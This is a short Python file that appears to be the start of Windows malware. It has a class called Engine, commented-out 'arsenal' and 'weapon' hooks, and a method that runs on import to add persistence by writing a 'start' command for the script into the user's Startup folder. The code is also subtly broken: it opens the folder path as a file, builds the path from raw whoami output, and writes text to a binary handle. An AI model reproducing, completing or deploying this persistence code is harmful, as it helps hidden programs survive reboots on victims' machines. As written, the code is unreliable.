import os
import sys
import git
import subprocess
# import arsenal
# import winreg




class Engine:
	def __init__(self):
		# self.weapon = arsenal.Arsenal()
		...


	def bootController(self):
		scriptName = os.path.dirname(os.path.realpath(__file__)) +'/'+ __file__
		shellScript = f'start {scriptName}'
		localUsername = subprocess.run('whoami', shell = True, stdout = subprocess.PIPE).stdout
		with open(f'C:/Users/{localUsername}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup', 'wb') as boot_file:
			boot_file.write(shellScript)



engine = Engine()
engine.bootController()
if __name__ == '__main__' and os.name == 'nt':
	...